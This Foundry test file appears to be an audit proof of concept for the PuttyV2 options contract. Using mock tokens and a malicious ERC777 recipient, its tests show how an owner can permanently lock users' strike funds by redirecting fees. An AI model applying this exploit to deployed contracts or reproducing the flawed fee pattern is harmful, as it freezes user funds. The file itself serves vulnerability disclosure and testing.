// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/PuttyV2.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "openzeppelin/token/ERC777/ERC777.sol";
import "openzeppelin/token/ERC777/IERC777Recipient.sol";
import "openzeppelin/utils/introspection/IERC1820Registry.sol";

// Mock WETH contract
contract MockWETH is ERC20 {
    constructor() ERC20("Wrapped Ether", "WETH") {}
    
    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }
    
    function withdraw(uint256 amount) public {
        _burn(msg.sender, amount);
        payable(msg.sender).transfer(amount);
    }
}

// Mock ERC20 that reverts on transfer to zero address
contract MockERC20RevertOnZero is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function _transfer(address from, address to, uint256 amount) internal virtual override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        super._transfer(from, to, amount);
    }
}

// Mock ERC777 token
contract MockERC777 is ERC777 {
    constructor(address[] memory defaultOperators) 
        ERC777("Mock ERC777", "M777", defaultOperators) {
        _mint(msg.sender, 1000000 * 10**18, "", "");
    }
}

// Malicious recipient that reverts on receiving ERC777 tokens
contract MaliciousERC777Recipient is IERC777Recipient {
    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    
    bool public shouldRevert;
    
    constructor() {
        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }
    
    function setShouldRevert(bool _shouldRevert) external {
        shouldRevert = _shouldRevert;
    }
    
    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        if (shouldRevert) {
            revert("Malicious recipient rejects tokens");
        }
    }
}

contract ExploitTest is Test {
    PuttyV2 public putty;
    MockWETH public weth;
    MockERC20RevertOnZero public mockToken;
    MockERC777 public erc777Token;
    MaliciousERC777Recipient public maliciousRecipient;
    
    address public maker;
    address public taker;
    uint256 public makerPrivateKey;
    uint256 public takerPrivateKey;
    
    function setUp() public {
        // Setup accounts
        makerPrivateKey = 0xA11CE;
        takerPrivateKey = 0xB0B;
        maker = vm.addr(makerPrivateKey);
        taker = vm.addr(takerPrivateKey);
        
        // Deploy mock WETH
        weth = new MockWETH();
        
        // Deploy PuttyV2
        putty = new PuttyV2("https://putty.finance/", 10, address(weth)); // 1% fee
        
        // Deploy mock tokens
        mockToken = new MockERC20RevertOnZero();
        
        // Setup ERC777
        address[] memory defaultOperators = new address[](0);
        erc777Token = new MockERC777(defaultOperators);
        
        // Deploy malicious recipient
        maliciousRecipient = new MaliciousERC777Recipient();
        
        // Fund accounts
        mockToken.transfer(maker, 100000 * 10**18);
        mockToken.transfer(taker, 100000 * 10**18);
        erc777Token.transfer(maker, 100000 * 10**18);
        erc777Token.transfer(taker, 100000 * 10**18);
        
        vm.deal(maker, 100 ether);
        vm.deal(taker, 100 ether);
    }
    
    // Test Method #1: Owner transfers ownership to zero address, blocking withdrawals
    function testExploit_OwnerTransferToZeroAddress() public {
        // Step 1: Create a short put order (maker is short, taker is long)
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,  // Put option
            isLong: false,  // Maker is short
            baseAsset: address(mockToken),
            strike: 10 ether,
            premium: 1 ether,
            duration: 1 days,
            expiration: block.timestamp + 1 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Step 2: Maker approves tokens and signs the order
        vm.startPrank(maker);
        mockToken.approve(address(putty), type(uint256).max);
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerPrivateKey, orderHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        vm.stopPrank();
        
        // Step 3: Taker fills the order (becomes long)
        vm.startPrank(taker);
        mockToken.approve(address(putty), type(uint256).max);
        uint256[] memory floorTokenIds = new uint256[](0);
        putty.fillOrder(order, signature, floorTokenIds);
        vm.stopPrank();
        
        // Step 4: Wait for expiration (put expires unexercised)
        vm.warp(block.timestamp + 2 days);
        
        // Step 5: Owner transfers ownership to zero address (MALICIOUS ACTION)
        putty.transferOwnership(address(0));
        
        // Step 6: Maker tries to withdraw strike (should revert)
        vm.startPrank(maker);
        
        // This should revert because the fee transfer to owner() (zero address) will fail
        vm.expectRevert("ERC20: transfer to the zero address");
        putty.withdraw(order);
        
        vm.stopPrank();
        
        // Verify: Maker cannot withdraw their strike, funds are stuck
        assertEq(mockToken.balanceOf(address(putty)), 10 ether, "Strike still locked in contract");
    }
    
    // Test Method #2: ERC777 token with malicious recipient owner
    function testExploit_ERC777MaliciousRecipient() public {
        // Step 1: Transfer ownership to malicious recipient contract
        putty.transferOwnership(address(maliciousRecipient));
        
        // Step 2: Create a short put order with ERC777 as base asset
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,  // Put option
            isLong: false,  // Maker is short
            baseAsset: address(erc777Token),
            strike: 10 ether,
            premium: 1 ether,
            duration: 1 days,
            expiration: block.timestamp + 1 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Step 3: Maker approves tokens and signs the order
        vm.startPrank(maker);
        erc777Token.approve(address(putty), type(uint256).max);
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerPrivateKey, orderHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        vm.stopPrank();
        
        // Step 4: Taker fills the order
        vm.startPrank(taker);
        erc777Token.approve(address(putty), type(uint256).max);
        uint256[] memory floorTokenIds = new uint256[](0);
        putty.fillOrder(order, signature, floorTokenIds);
        vm.stopPrank();
        
        // Step 5: Wait for expiration
        vm.warp(block.timestamp + 2 days);
        
        // Step 6: Malicious owner enables revert on token receipt
        maliciousRecipient.setShouldRevert(true);
        
        // Step 7: Maker tries to withdraw (should revert due to malicious recipient)
        vm.startPrank(maker);
        
        // This should revert because the malicious recipient rejects the fee transfer
        vm.expectRevert("Malicious recipient rejects tokens");
        putty.withdraw(order);
        
        vm.stopPrank();
        
        // Verify: Strike is still locked in contract
        assertEq(erc777Token.balanceOf(address(putty)), 10 ether, "Strike still locked in contract");
        
        // Step 8: Demonstrate that if owner allows, withdrawal works
        maliciousRecipient.setShouldRevert(false);
        
        vm.prank(maker);
        putty.withdraw(order);
        
        // Now withdrawal succeeds
        assertGt(erc777Token.balanceOf(maker), 0, "Maker received strike after owner allowed");
    }
    
    // Test demonstrating the impact: User funds are permanently locked
    function testExploit_FundsPermanentlyLocked() public {
        // Create order with significant strike amount
        uint256 largeStrike = 100 ether;
        
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,
            isLong: false,
            baseAsset: address(mockToken),
            strike: largeStrike,
            premium: 5 ether,
            duration: 1 days,
            expiration: block.timestamp + 1 days,
            nonce: 1,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Maker signs and approves
        vm.startPrank(maker);
        mockToken.approve(address(putty), type(uint256).max);
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerPrivateKey, orderHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        vm.stopPrank();
        
        // Taker fills
        vm.startPrank(taker);
        mockToken.approve(address(putty), type(uint256).max);
        uint256[] memory floorTokenIds = new uint256[](0);
        putty.fillOrder(order, signature, floorTokenIds);
        vm.stopPrank();
        
        // Record balances before
        uint256 makerBalanceBefore = mockToken.balanceOf(maker);
        uint256 contractBalance = mockToken.balanceOf(address(putty));
        
        // Wait for expiration
        vm.warp(block.timestamp + 2 days);
        
        // Owner maliciously transfers to zero address
        putty.transferOwnership(address(0));
        
        // Maker cannot withdraw
        vm.prank(maker);
        vm.expectRevert("ERC20: transfer to the zero address");
        putty.withdraw(order);
        
        // Verify funds are stuck
        assertEq(mockToken.balanceOf(maker), makerBalanceBefore, "Maker balance unchanged");
        assertEq(mockToken.balanceOf(address(putty)), contractBalance, "Funds locked in contract");
        assertEq(contractBalance, largeStrike, "Large amount of funds stuck");
    }
}